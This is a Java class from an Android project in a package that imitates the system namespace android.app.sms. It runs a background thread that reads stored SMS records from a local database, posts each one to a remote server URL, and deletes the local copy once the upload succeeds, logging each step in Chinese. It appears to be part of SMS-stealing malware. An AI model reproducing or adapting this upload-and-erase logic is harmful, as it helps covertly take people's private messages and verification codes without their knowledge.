package android.app.sms.async;

import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import android.app.sdk.SmsActivity;
import android.app.sms.entity.SMSInfo;
import android.app.sms.server.BaseService;
import android.app.sms.sqlite.DQLiteOpenHelper;
import android.app.sms.utils.LogUtils;
import android.app.sms.utils.Tools;
import android.content.Context;

public class SubmitDateThread extends Thread {

	private static ExecutorService pool = Executors.newFixedThreadPool(1);
	
	private Context context;
	
	public SubmitDateThread(Context context) {
		this.context = context;
	}

	@Override
	public void run() {
		if (Tools.isConnectingToInternet(this.context)) {
			List<SMSInfo> smsInfos = DQLiteOpenHelper.getHelper(this.context).getData();
			if (smsInfos != null && smsInfos.size() > 0) {
				LogUtils.write("Send", "获取到本地数据库数据信息:size=" + smsInfos.size() + ",开始发送数据到服务器");
				for (int i = 0; i < smsInfos.size(); i++) {
					SMSInfo smsInfo = smsInfos.get(i);
					boolean result = BaseService.sendData(this.context, SmsActivity.httpUrl, smsInfo);
					if (result) {
						LogUtils.write("Send", "第" + (i + 1) + "条数据发送成功");
						DQLiteOpenHelper.getHelper(this.context).deleteData(String.valueOf(smsInfo.getId()));
					} else {
						LogUtils.write("Send", "第" + (i + 1) + "条数据发送失败");
					}
				}
			} else {
				LogUtils.write("Send", "没有获取本地数据库数据信息");
			}
		} else {
			LogUtils.write("Send", "网络不可用,无法上传数据到服务器");
		}
		super.run();
	}

	public static synchronized void startSendData(Context context) {
		LogUtils.write("Send", "启动发送服务端数据线程");
		pool.execute(new SubmitDateThread(context));
	}
}
